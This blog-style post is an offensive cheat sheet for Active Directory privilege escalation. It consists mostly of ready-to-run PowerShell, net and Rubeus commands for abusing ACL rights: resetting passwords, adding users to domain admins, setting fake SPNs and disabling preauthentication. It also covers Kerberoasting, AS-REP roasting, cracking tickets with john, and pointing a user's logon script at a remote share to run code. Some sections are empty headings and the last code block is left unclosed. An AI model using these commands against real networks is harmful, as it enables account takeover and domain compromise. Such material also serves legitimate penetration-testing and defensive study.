---
layout: post
date: 30/10/2022
author: Aswin Gopalakrishnan
title: Privilege Escalation Techniques
---

# ACL Abuse
Access Control Lists (ACLs) are an essential part of Windows Active Directory security. They are used to control access to resources such as files, folders, and network shares. However, ACLs can be abused by attackers to gain unauthorized access to sensitive data.

One common ACL abuse technique is known as "over-permissioning." This occurs when an administrator grants more permissions than necessary to a user or group. For example, granting "Full Control" to a user who only needs "Read" access. This can lead to unintended consequences, such as data leaks or unauthorized modifications.

### GenericAll / GenericWrite / WriteProperty

#### On a User
- **Change Password**
    ```bash
    net user <username> <password> /domain
    ```
- **Targeted Kerberoasting**
    - Set a fake Service Principal Name (SPN):
        ```powershell
        Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
        ```
    - Obtain the hash:
        ```powershell
        .\Rubeus.exe kerberoast /user:<username> /nowrap
        ```
    - Clear the SPN:
        ```powershell
        Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
        ```
- **Disable Preauthentication**
    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

#### On a Group
- **Add to Group**
    - Using `net`:
        ```bash
        net group "domain admins" spotless/add /domain
        ```
    - Using Active Directory module:
        ```powershell
        Add-ADGroupMember -Identity "domain admins" -Members spotless
        ```
    - Using PowerSploit:
        ```powershell
        Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
        ```
        
#### On a Computer
- **Resource-Based Constrained Delegation (RBCD)**

### GenericWrite
- **User**
    - Overwrite logon script path for the target user:
        ```powershell
        Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
        ```

### AllExtendedRights
- **Password Reset**
- **Add to Group**

### Self-Membership
- **Add to Group**
    ```powershell
    Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
    ```

### ExtendedRight on
- **User-Force-Change-Password** (ObjectType)
    - **Password Reset**
        ```powershell
        Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
        Set-DomainUserPassword -Identity delegate -Verbose
        ```

### WriteProperty
- **Add to Group**
    ```powershell
    Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
    ```

### WriteOwner
- **Change the object’s owner**
    ```powershell
    Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
    ```
- **Check Owner**
    ```powershell
    Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
    ```

### WriteDACL
- **Grant Generic Permissions** (must be the owner)
    ```powershell
    $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
    $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
    $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
    $ADSI.psbase.commitchanges()
    ```


### DCSync Attack

## Kerberoasting
Kerberoasting targets accounts with Kerberos service tickets by exploiting service principal names (SPNs) and cracking the tickets offline.

### Find Service Accounts
- Using Active Directory:
    ```powershell
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    ```
- Using PowerView:
    ```powershell
    Get-DomainUser –SPN
    ```

### Escalation
- Use `Rubeus` to Kerberoast service accounts supporting RC4 encryption.
    ```powershell
    Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
    ```

### Crack Tickets
- Use `john` to crack Kerberos tickets:
    ```bash
    john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
    ```

### AS-REP Roasting
Find accounts without Kerberos preauthentication and request an AS-REP hash for offline cracking:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
Invoke-ASREPRoast -Verbose
